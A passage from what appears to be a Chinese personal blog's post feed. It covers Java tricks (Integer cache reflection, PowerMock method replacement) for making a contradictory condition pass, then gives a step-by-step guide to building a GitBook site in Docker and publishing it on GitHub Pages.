punctuation">.</span>high<span class="token punctuation">)</span>            <span class="token keyword">return</span> IntegerCache<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">-</span>IntegerCache<span class="token punctuation">.</span>low<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>回到这题判断条件中的 <code>1</code>/<code>2</code>/<code>3</code>，因为是通过计算在 <code>IntegerCache</code> 数组索引，从而获取其包装类对象：</p><ul><li><code>(Integer) 1 =&gt; Integer.valueOf(1) =&gt; IntegerCache.cache[129]</code></li><li><code>(Integer) 2 =&gt; Integer.valueOf(2) =&gt; IntegerCache.cache[130]</code></li><li><code>(Integer) 3 =&gt; Integer.valueOf(3) =&gt; IntegerCache.cache[131]</code></li></ul><p>那么只需要篡改 <code>IntegerCache</code> 数组，使得：</p><ul><li><code>IntegerCache.cache[130] = IntegerCache.cache[129]</code></li><li><code>IntegerCache.cache[131] = IntegerCache.cache[129]</code></li></ul><p>就可以令 <code>1</code>/<code>2</code>/<code>3</code> 取得的包装类是同一个对象（此时的 <code>1</code>/<code>2</code>/<code>3</code> 纯粹就是索引值）。</p><p>篡改方法可以用例 Java 的反射机制：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Java</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 利用反射机制获取 Integer cache[] 数组</span>        Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"cache"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer<span class="token punctuation">[</span><span class="token punctuation">]</span> cache <span class="token operator">=</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>        cache<span class="token punctuation">[</span><span class="token number">130</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 2 = (Integer) 1</span>        cache<span class="token punctuation">[</span><span class="token number">131</span><span class="token punctuation">]</span> <span class="token operator">=</span> cache<span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 令 (Integer) 3 = (Integer) 1</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Integer a <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>但是这种做法不够优雅，毕竟改了题目。</p><p>那有没有不改题目的实现方式呢？</p><p>是有的。</p><p>虽然 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，导致无法重写 <code>Integer.intValue()</code>。</p><p>但是可以利用 AOP 切到 <code>Integer.intValue()</code> 方法进行篡改。</p><p>在 Stack Overflow 就有人给出了类似的解题思路（理论上是可行的，但我并没有去验证，有兴趣的同学可以试试）：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span>AtomicInteger<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Before<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>Test<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span>RunWith<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>core<span class="token punctuation">.</span>classloader<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>PrepareForTest<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>powermock<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span>PowerMockRunner<span class="token punctuation">;</span><span class="token annotation punctuation">@PrepareForTest</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span>PowerMockRunner<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestJava</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 利用 AOP 把 Integer.intValue() 替换为 AtomicInteger.getAndIncrement()     */</span>    <span class="token annotation punctuation">@Before</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">before</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 自增整数</span>        <span class="token function">replace</span><span class="token punctuation">(</span><span class="token function">method</span><span class="token punctuation">(</span>Integer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">"intValue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">with</span><span class="token punctuation">(</span>                <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> method<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// lambda</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Integer a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="幕间"><a href="#幕间" class="headerlink" title="幕间"></a>幕间</h2><p>通过前面的解题过程可以发现，弱类型语言 相较于 强类型语言 会更容易实现底层逻辑篡改，主要是因为对语法特性的校验会更宽松。</p><blockquote><p>C++ 虽然和 Java 一样属于强类型语言，但是因为没有限制运算符重写而被钻了空子</p></blockquote><p>在渗透测试中，或者可以利用类似的手段，绕过一些条件语句达到目的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永假式 </tag>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 GitBook 在 Github 搭建个人网站</title>
      <link href="/website/gitbook-da-jian-ge-ren-wang-zhan/"/>
      <url>/website/gitbook-da-jian-ge-ren-wang-zhan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="传统的个人网站"><a href="#传统的个人网站" class="headerlink" title="传统的个人网站"></a>传统的个人网站</h3><p>在某个知名门户下面注册一个子域名，定制个性化内容。 例如 QQ空间、 博客园、 CSDN 等等。</p><p><strong>优点</strong>：</p><ul><li>无技术门槛</li><li>免费</li></ul><p><strong>缺点</strong>：</p><ul><li>站点风格受限： 只能使用有限的模板布置站点</li><li>文章数据无法直接迁移： 即使某些门户支持导出、也未必能导入到其他门户</li></ul><h3 id="稍微有点技术含量的个人网站"><a href="#稍微有点技术含量的个人网站" class="headerlink" title="稍微有点技术含量的个人网站"></a>稍微有点技术含量的个人网站</h3><p>租用一台云服务器，搭建一个 HTTP 服务，在其中放入你想展示的内容。</p><p><strong>优点</strong>：</p><ul><li>完全个性化：理论上只要你想到的都可以实现</li><li>能够赚钱： 广告引流、付费内容等</li><li>站点数据能够迁移： 一般存储在数据库中</li></ul><p><strong>缺点</strong>：</p><ul><li>收费： 租用个人云服务器最低配的差不多 ￥1000/年</li><li>其实并不能赚到什么钱：<br>　　· 百万流量广告引流？ 不好意思谷歌邮寄 PIN 码到国内 100% 丢件<br>　　· 内容付费？ 抱歉大部分人的文章并不足以让别人掏钱</li><li>非常繁琐的搭建过程和日常维护，来看一下你需要做什么：<br>　　· 申请域名、网站备案： 最快需要 1 个月<br>　　· 租用云服务器： 低配怕访问慢、高配怕财务困难<br>　　· 搭建 HTTP 服务： nginx、 apache<br>　　· 搭建数据库： MySQL、 MariaDB<br>　　· 搭建网站平台： wordpress、 Discuz!<br>　　· 网站平台模板/插件不好用： css、 js 各种魔改<br>　　· 安全加固： 后台被爆破、 前台被钓鱼<br>　　· 服务容灾： 进程挂起、 定期备份<br>　　· 访问加速： Redis缓存、 CDN<br>　　· 搜索引擎不收录： SEO、 提交链接</li></ul><p>把这些都处理好之后，终于可以开始发表文章，一切似乎都很安逸很顺利。</p><p>但很多问题就是发生了：</p><ul><li>写了几百篇文章之后，开始发现富文本编辑方式太呕心了</li><li>突然有一天某个内容解析插件升级之后，文章格式乱套了</li><li>突然某个 JS 链接被墙之后，发现 latex 公式变代码了</li></ul><p>难道想安逸地发表一些文章真的这么困难吗？</p><p>直到有一天我发现了 GitBook。</p><h2 id="GitBook-简介"><a href="#GitBook-简介" class="headerlink" title="GitBook 简介"></a>GitBook 简介</h2><p>GitBook 是一个基于 Node.js 的命令行工具，支持 Markdown 和 AsciiDoc 两种语法格式，可以把这种格式的文本输出为 HTML、 PDF、 eBook 等格式的电子书。</p><p>事实上可以认为 GitBook 的本质就是一个文档格式转换工具。</p><p>GitBook 社区具有丰富的主题模块和插件模块，而且这些 主题/插件 都是开源的，大部分都可以从 GitHub 上找到，所以可以很简单地找到我们需要的 主题/插件 ，甚至能简单地对其进行微调。</p><h2 id="为什么是-GitBook-amp-GitHub"><a href="#为什么是-GitBook-amp-GitHub" class="headerlink" title="为什么是 GitBook &amp; GitHub"></a>为什么是 GitBook &amp; GitHub</h2><p>其实当知道 GitBook 可以把 Markdown 转换成 HTML 格式电子书之后，就基本可以确定这个组合了：</p><ul><li>GitHub 天然支持 Markdown 语法，可以直接使用 Markdown 编写文章</li><li>GitHub 可以借用 Git 对文章进行版本管理</li><li>GitHub 为每个仓库提供了 300M 免费空间的 GitHub Pages （只支持 HTML），足够用于发布个人的静态网站</li><li>GitBook 可以把 Markdown 文章转换成 HTML 电子书供 GitHub Pages 发布</li><li>极简主义： 程序员的网站不需要太多花哨的东西，文章才是核心，站点越简洁越美观</li></ul><hr><h2 id="搭建-GitBook-环境"><a href="#搭建-GitBook-环境" class="headerlink" title="搭建 GitBook 环境"></a>搭建 GitBook 环境</h2><blockquote><p>GitBook 在 3.2.3 版本之后就开始收费了，但是收费之后反而阉割了不少功能，不建议使用最新版</p></blockquote><p>为了使得 GitBook 的运行环境可以固化在 3.2.3 版本，这里使用 Docker 实现。</p><p>且为了方便使用，我已将其打包成 Docker 镜像，其 Dockerfile 脚本已上传到 GitHub： <a href="https://github.com/lyy289065406/gitbook-server-docker">gitbook-server-docker</a> 。</p><blockquote><p>注：<br>　因为 gitbook 服务是运行在 Docker 中，所以不论使用哪个平台，都要预装好 Docker 环境<br>　但是本文所使用的基础镜像是基于 Linux 的，因此 Docker in Windows 是无法直接安装的<br>　所以针对 Windows 10 ，推荐使用 WSL ( Windows Subsystem for Linux )<br>　通过 WSL 安装 Ubuntu 系统，然后再<a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">在 Ubuntu 里面安装 Docker Deamon</a><br>　最后 Docker in Windows 做端口映射，就可以实现 Windows 到 Linux 的无缝对接<br>　具体的 Windows Docker 环境部署方法可参考 《<a href="https://www.jianshu.com/p/97d16b68045f">简书： Win10 内置 Ubuntu 完美使用 Docker in Windows</a>》<br>　至于 Linux 和 Mac 则简单得多，直接安装 Docker Deamon 即可使用，具体方法自行谷歌</p></blockquote><p><img src="./00.png"></p><h3 id="构建-GitBook-镜像"><a href="#构建-GitBook-镜像" class="headerlink" title="构建 GitBook 镜像"></a>构建 GitBook 镜像</h3><p>首先安装 <code>git</code> 命令行工具，然后 <code>clone</code> 上述的 <a href="https://github.com/lyy289065406/gitbook-server-docker">gitbook-server-docker</a> 仓库到本地：</p><p><code>git clone https://github.com/lyy289065406/gitbook-server-docker</code></p><p>在命令行环境下 <strong>打开本地仓库目录</strong> 。 Docker 脚本已经编排好在 <a href="https://github.com/lyy289065406/gitbook-server-docker/blob/master/Dockerfile"><code>./Dockerfile</code></a> 中，可以不修改直接使用。</p><p>构建 Docker 镜像（镜像名称 <code>exp/gitbook-server</code> 可根据 Docker 规范自定义修改）：</p><p><code>docker build . -t exp/gitbook-server:latest</code></p><p><img src="./01.png"></p><p>至此镜像已经安装完毕，下文主要是测试 GitBook 镜像是否可用。</p><h3 id="初始化-GitBook-项目"><a href="#初始化-GitBook-项目" class="headerlink" title="初始化 GitBook 项目"></a>初始化 GitBook 项目</h3><p>在 Docker 镜像中执行命令 <code>gitbook init</code>：</p><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" exp/gitbook-server gitbook init</code></p><blockquote><p>　该命令会自动创建默认的 GitBook 目录结构。<br>　实际效果就是在工作目录 <code>./gitbook</code> 下创建两个符合 GitBook 语法的文件 <code>README.md</code> 和 <code>SUMMARY.md</code> 。<br>　<em>更多的 GitBook 语法详见 《<a href="https://yangjh.oschina.io/gitbook/">GitBook 学习笔记</a>》</em></p></blockquote><h3 id="关于-GitBook-目录结构说明"><a href="#关于-GitBook-目录结构说明" class="headerlink" title="关于 GitBook 目录结构说明"></a>关于 GitBook 目录结构说明</h3><p><img src="./02.png"></p><pre><code>exp-blog|-- .gitignore  ..............  [Git 过滤配置]|-- Dockerfile  ..............  [构建 GitBook 本地服务器的 Docker 脚本]|-- build.ps1  ...............  [重新编译博客变更内容，并使其适用于 Github Pages（Windows 脚本）]|-- build.sh  ................  [重新编译博客变更内容，并使其适用于 Github Pages（Linux 脚本）]|-- index.html  ..............  [Github Pages 首页（会自动跳转到博客首页）]|-- gitbook  .................  [GitBook 的工作目录，存储博客数据]|   |-- _book  ...............  [用 GitBook 编译生成的静态网站数据，用于本地测试（因含下划线不被 Github Pages 支持）]|   |-- book  ................  [用 build.ps1/sh 脚本所复制 _book 目录的镜像，用于 Github Pages 发布]|   |-- res  .................  [存储博客资源的目录]|   |-- markdown  ............  [存储博客文章的目录（只有 *.md 文件）]|   |-- README.md  ...........  [博客介绍文档（固定文件）]|   |-- SUMMARY.md  ..........  [博客目录索引（固定文件）]|   |-- node_modules  ........  [GitBook 的插件目录]|   |-- book.json  ...........  [GitBook 的插件配置]|   └-- package-lock.json  ...  [nodojs 插件依赖关系文件（安装插件时会自动更新）]|-- LICENSE  .................  [版权说明]└-- README.md  ...............  [此仓库的说明文档]</code></pre><h3 id="构建-GitBook-项目"><a href="#构建-GitBook-项目" class="headerlink" title="构建 GitBook 项目"></a>构建 GitBook 项目</h3><p>在 Docker 镜像中执行命令 <code>gitbook build</code>：</p><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" exp/gitbook-server gitbook build</code></p><blockquote><p>　该命令会根据 GitBook 文件 <code>README.md</code> 和 <code>SUMMARY.md</code> 构建 html 项目 。<br>　实际效果就是在工作目录 <code>./gitbook</code> 下构建目录名为 <code>_book</code> 的静态网页文件 。<br>　本地可以通过 <code>./gitbook/_book/index.html</code> 测试访问 。</p></blockquote><p><img src="./03.png"></p><h3 id="启动-GitBook-服务"><a href="#启动-GitBook-服务" class="headerlink" title="启动 GitBook 服务"></a>启动 GitBook 服务</h3><p>在 Docker 镜像中执行命令 <code>gitbook serve</code>：</p><p><code>docker run -d --rm -v "$PWD/gitbook:/gitbook" -p 4000:4000 exp/gitbook-server gitbook serve</code></p><blockquote><p>该命令效果就是构建一个可以访问 <code>./gitbook/_book/index.html</code> 的 Web 服务。</p></blockquote><p><img src="./04.png"></p><h3 id="关于前文中-Docker-命令的参数的含义"><a href="#关于前文中-Docker-命令的参数的含义" class="headerlink" title="关于前文中 Docker 命令的参数的含义"></a>关于前文中 Docker 命令的参数的含义</h3><p><code>docker run --rm -v "$PWD/gitbook:/gitbook" -p 4000:4000 exp/gitbook-server &lt;Command&gt;</code></p><ul><li><code>docker run</code>：运行镜像</li><li><code>--rm</code>：退出镜像后自动删除运行时产生的数据（此镜像目的是提供 GitBook 的运行环境，故没必要保留数据）</li><li><code>-v "$PWD/gitbook:/gitbook"</code>：把本地工作目录 <code>$PWD/gitbook</code> 挂载到镜像的工作目录 <code>/gitbook</code> （这样运行 GitBook 期间的工作数据就会从本地映射到镜像内，即使镜像退出运行，数据依旧会保留在本地）</li><li><code>-p 4000:4000</code>：把镜像内 GitBook 的 4000 服务端口暴露到本地物理机的 4000 端口</li><li><code>exp/gitbook-server</code>：目标镜像名称</li><li><code>&lt;Command&gt;</code>：要在镜像内执行的命令，如 <code>gitbook serve</code> 等，更多命令可见 <a href="https://github.com/GitbookIO/gitbook-cli">gitbook-cli</a></li></ul><hr><h2 id="发布站点到-GitHub-Page"><a href="#发布站点到-GitHub-Page" class="headerlink" title="发布站点到 GitHub Page"></a>发布站点到 GitHub Page</h2><p>事实上只需要把前面通过 <code>gitbook build</code> 所生成的 <code>_book</code> 目录 commit 到 GitHub， 然后在 GitHub 仓库的 Settings 中启用 GitHub Page 即可。</p><p>这里需要注意的是：</p><ul><li>GitHub Page 不允许站点路径以下划线开头，因此在 commit 前需要把 <code>_book</code> 重命名为 <code>book</code></li><li>GitHub Page 的站点主页是仓库的根目录，而 GitBook 的站点主页是在 <code>_book</code> 目录下，为了统一主页，可以在 GitHub 仓库根目录添加一个 <code>index.html</code> 文件，内容如下：</li></ul><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>robots<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noarchive<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>EXP<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>IE<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>EXP-BLOG<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 自动从 Github Pages 的首页跳转到 GitBook 的首页 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0; url<span class="token punctuation">=</span>./gitbook/book/index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="站点优化：安装-GitBook-插件"><a href="#站点优化：安装-GitBook-插件" class="headerlink" title="站点优化：安装 GitBook 插件"></a>站点优化：安装 GitBook 插件</h2><p>GitBook 的精粹在于丰富的插件以扩展其功能，插件可通过工作目录下的 <a href="https://github.com/lyy289065406/exp-blog/blob/master/gitbook/book.json"><code>book.json</code></a> 配置并控制，相关说明见 <a href="https://docs.gitbook.com/v2-changes/important-differences#plugins">官方文档</a>。</p><p>推荐 GitBook 安装的插件可参考 <a href="http://gitbook.zhangjikai.com/plugins.html">这份清单</a> 。</p><p>根据插件命名约定，若 <strong>插件名称</strong> 为 <code>prism</code> ，则其对应 <strong>安装包名称</strong> 为 <code>gitbook-plugin-prism</code> 。</p><p>以 <code>prism</code> 插件为例，安装方式有两种：</p><ul><li>通过 GitBook 安装：把插件名称 <code>prism</code> 添加到 <code>book.json</code> 的 <code>plugins</code> 列表，执行 <code>gitbook install</code> 命令</li><li>通过 nodejs 安装：执行 <code>npm install gitbook-plugin-prism</code> 命令安装指定插件，然后把插件名称 <code>prism</code> 配置到 <code>book.json</code> 的 <code>plugins</code> 列表使其生效</li></ul><blockquote><p>　方法一每次执行都会检查现有插件是否需要更新。<br>　方法二只有特定插件受影响，适合于存在自定义修改过插件代码的情况。</p></blockquote><p>注意， Guthub Pages 不支持使用了 Octopress 框架的插件，详见 《<a href="https://help.github.com/en/github/working-with-github-pages/about-github-pages-and-jekyll">About GitHub Pages and Jekyll</a>》 。</p><p>若使用了这类插件，Guthub Pages 是无法发布成功的。 判定是不是使用了这类插件的方法也很简单：</p><ul><li>提交变更内容后，点击 Github 仓库下的 branch 查看 master 分支</li><li>master 分支会提示最近提交内容的 Guthub Pages 构建情况</li><li>若构建失败，可以点击 Details 查看详情</li><li>假如提示 <code>is not a recognised Liquid tag</code> 说明就是采用了 Octopress 框架的插件</li></ul><p><img src="./08.png"><br><img src="./09.png"><br><img src="./10.png"></p><h2 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h2><p>通过 GitHub Page 发布的站点有个问题，就是 URL 地址不方便记忆。</p><p>如果有申请个人域名的话，是可以自定义 GitHub Page 域名的。</p><p>首先需要购买域名解析服务，添加 CNAME 规则把个人域名解析到 GitHub Page，然后再在 GitHub Page 配置个人域名即可。</p><p><img src="./12.png"><br><img src="./13.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitBook </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取 Sysmon 事件信息</title>
      <link href="/lang/getsysmon/"/>
      <url>/lang/getsysmon/</url>
      
